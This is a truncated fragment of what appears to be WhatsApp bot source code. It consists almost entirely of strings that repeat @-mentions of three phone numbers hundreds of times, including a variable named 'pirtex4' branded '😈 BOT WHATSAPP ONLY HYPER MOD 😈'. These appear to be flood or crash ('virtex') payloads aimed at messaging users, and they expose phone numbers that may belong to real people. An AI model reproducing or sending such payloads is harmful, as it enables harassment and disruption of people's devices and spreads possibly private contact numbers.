@⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩*'
				pirtex4 = '*_😈 BOT WHATSAPP ONLY HYPER MOD 😈_* https://youtube.com/c/HYPERMOD _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 524-4699⁩ *_ _*@⁨+1 (956) 